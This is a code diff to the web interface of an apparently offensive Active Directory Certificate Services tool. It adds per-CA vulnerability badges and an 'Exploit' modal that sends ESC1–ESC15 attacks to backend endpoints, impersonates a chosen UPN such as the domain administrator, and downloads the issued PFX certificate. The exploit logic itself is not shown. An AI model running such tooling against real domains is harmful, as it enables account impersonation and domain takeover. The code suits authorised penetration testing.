@@ -91,12 +91,28 @@
                     </a>
 
                     {% for ca in cas %}
-                    <a href="/adcs?ca={{ ca.name|urlencode }}{% if vulnerable_only %}&vulnerable=true{% endif %}{% if enabled_only %}&enabled=true{% endif %}"
-                       class="block p-3 rounded-lg border transition {% if selected_ca == ca.name %}bg-red-500/10 border-red-500/50 text-white{% else %}border-neutral-700 hover:border-neutral-600 text-neutral-300 hover:text-white{% endif %}">
-                        <div class="font-medium truncate">{{ ca.name }}</div>
-                        <div class="text-xs text-neutral-500 truncate">{{ ca.dns_hostname }}</div>
-                        <div class="text-xs text-neutral-500">{{ summary.total_templates }} templates</div>
-                    </a>
+                    <div class="rounded-lg border transition {% if selected_ca == ca.name %}bg-red-500/10 border-red-500/50{% else %}border-neutral-700 hover:border-neutral-600{% endif %}">
+                        <a href="/adcs?ca={{ ca.name|urlencode }}{% if vulnerable_only %}&vulnerable=true{% endif %}{% if enabled_only %}&enabled=true{% endif %}"
+                           class="block p-3 {% if selected_ca == ca.name %}text-white{% else %}text-neutral-300 hover:text-white{% endif %}">
+                            <div class="font-medium truncate">{{ ca.name }}</div>
+                            <div class="text-xs text-neutral-500 truncate">{{ ca.dns_hostname }}</div>
+                            <div class="text-xs text-neutral-500">{{ ca.certificate_templates|length }} templates</div>
+                        </a>
+                        {% if ca.is_vulnerable %}
+                        <div class="px-3 pb-3 flex flex-wrap gap-1.5">
+                            {% for vuln in ca.vulnerabilities %}
+                            <span class="px-1.5 py-0.5 rounded text-xs font-mono bg-orange-500/20 text-orange-400" title="{{ vuln.description }}">{{ vuln.id }}</span>
+                            {% endfor %}
+                            {% set has_esc7 = ca.vulnerabilities|selectattr('id', 'equalto', 'ESC7')|list %}
+                            {% if has_esc7 %}
+                            <button onclick="event.preventDefault(); openExploitModal('ESC7', '', '{{ ca.name }}')"
+                                    class="px-1.5 py-0.5 rounded text-xs font-medium bg-red-600 hover:bg-red-700 text-white transition">
+                                <i class="fas fa-bolt mr-0.5"></i>ESC7
+                            </button>
+                            {% endif %}
+                        </div>
+                        {% endif %}
+                    </div>
                     {% endfor %}
                 </div>
                 {% else %}
@@ -353,6 +369,64 @@
     </div>
 </div>
 
+<!-- Exploit Modal -->
+<div id="exploit-modal-overlay" class="hidden fixed inset-0 z-[60] bg-black/60 flex items-center justify-center" onclick="closeExploitModal(event)">
+    <div class="bg-neutral-900 border border-neutral-700 rounded-xl shadow-2xl w-full max-w-lg mx-4" onclick="event.stopPropagation()">
+        <!-- Modal Header -->
+        <div class="flex items-center justify-between px-5 py-4 border-b border-neutral-800">
+            <div>
+                <h3 class="text-lg font-bold text-white" id="exploit-modal-title">Exploit ESC</h3>
+                <p class="text-xs text-neutral-500 mt-0.5" id="exploit-modal-subtitle"></p>
+            </div>
+            <button onclick="closeExploitModal()" class="text-neutral-400 hover:text-white p-1">
+                <i class="fas fa-times"></i>
+            </button>
+        </div>
+
+        <!-- Warning -->
+        <div class="mx-5 mt-4 p-3 rounded-lg bg-yellow-500/10 border border-yellow-500/30 text-xs text-yellow-400">
+            <i class="fas fa-exclamation-triangle mr-1.5"></i>
+            <span id="exploit-modal-warning">This will modify AD objects. Original values are restored after exploitation.</span>
+        </div>
+
+        <!-- Form -->
+        <form id="exploit-form" class="px-5 py-4 space-y-3" onsubmit="submitExploit(event)">
+            <input type="hidden" name="esc_id" id="exploit-esc-id">
+
+            <div>
+                <label class="block text-xs text-neutral-500 mb-1">CA Name</label>
+                <input type="text" name="ca_name" id="exploit-ca" class="w-full rounded-lg border border-neutral-700 bg-neutral-800 px-3 py-2 text-sm text-white focus:ring-red-500/50 focus:border-red-500/50" required>
+            </div>
+
+            <div>
+                <label class="block text-xs text-neutral-500 mb-1">Template</label>
+                <input type="text" name="template" id="exploit-template" class="w-full rounded-lg border border-neutral-700 bg-neutral-800 px-3 py-2 text-sm text-white focus:ring-red-500/50 focus:border-red-500/50" required>
+            </div>
+
+            <div>
+                <label class="block text-xs text-neutral-500 mb-1">Target UPN (impersonate)</label>
+                <input type="text" name="upn" id="exploit-upn" placeholder="administrator@domain.local" class="w-full rounded-lg border border-neutral-700 bg-neutral-800 px-3 py-2 text-sm text-white placeholder-neutral-500 focus:ring-red-500/50 focus:border-red-500/50" required>
+            </div>
+
+            <!-- ESC9-specific: target account -->
+            <div id="exploit-target-group" class="hidden">
+                <label class="block text-xs text-neutral-500 mb-1">Target Account (sAMAccountName)</label>
+                <input type="text" name="target_sam" id="exploit-target-sam" placeholder="victim_user" class="w-full rounded-lg border border-neutral-700 bg-neutral-800 px-3 py-2 text-sm text-white placeholder-neutral-500 focus:ring-red-500/50 focus:border-red-500/50">
+                <p class="text-xs text-neutral-600 mt-1">Account you have GenericWrite on - its UPN will be temporarily swapped</p>
+            </div>
+
+            <button type="submit" id="exploit-submit-btn" class="w-full px-4 py-2.5 rounded-lg bg-red-600 hover:bg-red-700 text-white text-sm font-semibold transition mt-2">
+                <i class="fas fa-bolt mr-2"></i>Exploit
+            </button>
+        </form>
+
+        <!-- Result Area -->
+        <div id="exploit-result" class="hidden px-5 pb-5">
+            <div id="exploit-result-content" class="p-3 rounded-lg text-sm"></div>
+        </div>
+    </div>
+</div>
+
 <script>
 function toggleVulnerableFilter() {
     var checkbox = document.getElementById('vulnerable-filter');
@@ -408,9 +482,132 @@ function closeTemplateDetail() {
 // Close on Escape
 document.addEventListener('keydown', function(e) {
     if (e.key === 'Escape') {
-        closeTemplateDetail();
+        var modal = document.getElementById('exploit-modal-overlay');
+        if (!modal.classList.contains('hidden')) {
+            modal.classList.add('hidden');
+        } else {
+            closeTemplateDetail();
+        }
     }
 });
+
+// Exploit Modal
+var ESC_CONFIG = {
+    'ESC1':  {endpoint: '/api/adcs/request', warning: 'Requests a certificate with an arbitrary SAN (UPN). No AD modification.', fields: ['ca','template','upn']},
+    'ESC2':  {endpoint: '/api/adcs/request', warning: 'Requests a certificate with Any Purpose EKU. No AD modification.', fields: ['ca','template','upn']},
+    'ESC4':  {endpoint: '/api/adcs/exploit/esc4', warning: 'Temporarily modifies the template (enables SAN, adds Client Auth, removes approval). Attributes are restored after the certificate is issued.', fields: ['ca','template','upn']},
+    'ESC6':  {endpoint: '/api/adcs/request', warning: 'CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled. Requests a certificate with arbitrary SAN. No AD modification.', fields: ['ca','template','upn']},
+    'ESC7':  {endpoint: '/api/adcs/exploit/esc7', warning: 'Enables EDITF_ATTRIBUTESUBJECTALTNAME2 via ManageCA, requests a cert, then restores the flag.', fields: ['ca','template','upn']},
+    'ESC9':  {endpoint: '/api/adcs/exploit/esc9', warning: 'Temporarily swaps the UPN on the target account, requests a cert, then restores the original UPN.', fields: ['ca','template','upn','target_sam']},
+    'ESC13': {endpoint: '/api/adcs/request', warning: 'Requests a certificate using an OID-linked template. No AD modification.', fields: ['ca','template','upn']},
+    'ESC15': {endpoint: '/api/adcs/request', warning: 'Requests a certificate using a Schema V1 template with SAN. No AD modification.', fields: ['ca','template','upn']},
+};
+
+function openExploitModal(escId, templateName, caName) {
+    var cfg = ESC_CONFIG[escId];
+    if (!cfg) { showToast('Exploit not implemented for ' + escId, 'error'); return; }
+
+    document.getElementById('exploit-esc-id').value = escId;
+    document.getElementById('exploit-modal-title').textContent = 'Exploit ' + escId;
+    document.getElementById('exploit-modal-subtitle').textContent = templateName + ' on ' + caName;
+    document.getElementById('exploit-modal-warning').textContent = cfg.warning;
+    document.getElementById('exploit-ca').value = caName;
+    document.getElementById('exploit-template').value = templateName;
+    document.getElementById('exploit-upn').value = '';
+
+    // Template required for all except ESC7 (auto-detects)
+    var templateInput = document.getElementById('exploit-template');
+    templateInput.required = (escId !== 'ESC7');
+    if (escId === 'ESC7' && !templateName) {
+        templateInput.placeholder = 'Auto-detect (optional)';
+    } else {
+        templateInput.placeholder = '';
+    }
+
+    // ESC9 target field
+    var targetGroup = document.getElementById('exploit-target-group');
+    var targetInput = document.getElementById('exploit-target-sam');
+    if (cfg.fields.indexOf('target_sam') !== -1) {
+        targetGroup.classList.remove('hidden');
+        targetInput.required = true;
+    } else {
+        targetGroup.classList.add('hidden');
+        targetInput.required = false;
+        targetInput.value = '';
+    }
+
+    // Reset result
+    document.getElementById('exploit-result').classList.add('hidden');
+    document.getElementById('exploit-submit-btn').disabled = false;
+    document.getElementById('exploit-submit-btn').innerHTML = '<i class="fas fa-bolt mr-2"></i>Exploit';
+
+    document.getElementById('exploit-modal-overlay').classList.remove('hidden');
+}
+
+function closeExploitModal(e) {
+    if (e && e.target !== e.currentTarget) return;
+    document.getElementById('exploit-modal-overlay').classList.add('hidden');
+}
+
+function submitExploit(e) {
+    e.preventDefault();
+    var escId = document.getElementById('exploit-esc-id').value;
+    var cfg = ESC_CONFIG[escId];
+    if (!cfg) return;
+
+    var btn = document.getElementById('exploit-submit-btn');
+    var resultDiv = document.getElementById('exploit-result');
+    var resultContent = document.getElementById('exploit-result-content');
+
+    btn.disabled = true;
+    btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Exploiting...';
+    resultDiv.classList.add('hidden');
+
+    var fd = new FormData(document.getElementById('exploit-form'));
+
+    fetch(cfg.endpoint, {method: 'POST', body: fd})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            resultDiv.classList.remove('hidden');
+            if (data.success) {
+                // Download PFX
+                var raw = atob(data.pfx_b64);
+                var arr = new Uint8Array(raw.length);
+                for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
+                var blob = new Blob([arr], {type: 'application/x-pkcs12'});
+                var a = document.createElement('a');
+                a.href = URL.createObjectURL(blob);
+                a.download = (fd.get('upn') || escId) + '.pfx';
+                a.click();
+
+                var ci = data.cert_info || {};
+                resultContent.className = 'p-3 rounded-lg text-sm bg-green-500/10 border border-green-500/30 text-green-400';
+                resultContent.textContent = '';
+                var icon = document.createElement('i'); icon.className = 'fas fa-check-circle mr-1.5'; resultContent.appendChild(icon);
+                var strong = document.createElement('strong'); strong.textContent = escId + ' exploit successful!'; resultContent.appendChild(strong);
+                resultContent.appendChild(document.createElement('br'));
+                var details = document.createElement('span'); details.className = 'text-xs text-neutral-400';
+                details.textContent = (ci.subject ? 'Subject: ' + ci.subject + ' | ' : '') + (ci.issuer ? 'Issuer: ' + ci.issuer + ' | ' : '') + (ci.serial ? 'Serial: ' + ci.serial : '');
+                resultContent.appendChild(details);
+                resultContent.appendChild(document.createElement('br'));
+                var dl = document.createElement('span'); dl.className = 'text-xs text-green-500 mt-1 inline-block'; dl.textContent = 'PFX file downloaded'; resultContent.appendChild(dl);
+                showToast(escId + ' exploit successful! PFX downloaded.', 'success');
+            } else {
+                resultContent.className = 'p-3 rounded-lg text-sm bg-red-500/10 border border-red-500/30 text-red-400';
+                resultContent.textContent = data.message;
+                showToast(escId + ' exploit failed', 'error');
+            }
+        })
+        .catch(function(err) {
+            resultDiv.classList.remove('hidden');
+            resultContent.className = 'p-3 rounded-lg text-sm bg-red-500/10 border border-red-500/30 text-red-400';
+            resultContent.textContent = 'Error: ' + err.message;
+        })
+        .finally(function() {
+            btn.disabled = false;
+            btn.innerHTML = '<i class="fas fa-bolt mr-2"></i>Exploit';
+        });
+}
 
 // Certificate Request
 function requestCert(e) {
@@ -440,19 +637,17 @@ function requestCert(e) {
 
                 result.className = 'mt-2 p-3 rounded-lg text-sm bg-green-500/10 border border-green-500/30 text-green-400';
                 var ci = data.cert_info;
-                result.innerHTML = '<i class="fas fa-check-circle mr-1"></i>Certificate issued!<br>' +
-                    '<span class="text-xs text-neutral-400">Subject: ' + ci.subject + '<br>Issuer: ' + ci.issuer +
-                    '<br>Valid until: ' + ci.not_after + '</span>';
+                result.textContent = 'Certificate issued! Subject: ' + ci.subject + ' | Issuer: ' + ci.issuer + ' | Valid until: ' + ci.not_after;
                 showToast('Certificate issued and PFX downloaded!', 'success');
             } else {
                 result.className = 'mt-2 p-3 rounded-lg text-sm bg-red-500/10 border border-red-500/30 text-red-400';
-                result.innerHTML = '<i class="fas fa-times-circle mr-1"></i>' + data.message;
+                result.textContent = data.message;
                 showToast('Certificate request failed', 'error');
             }
         })
         .catch(function(err) {
             result.className = 'mt-2 p-3 rounded-lg text-sm bg-red-500/10 border border-red-500/30 text-red-400';
-            result.innerHTML = '<i class="fas fa-times-circle mr-1"></i>Error: ' + err.message;
+            result.textContent = 'Error: ' + err.message;
         })
         .finally(function() {
             btn.disabled = false;
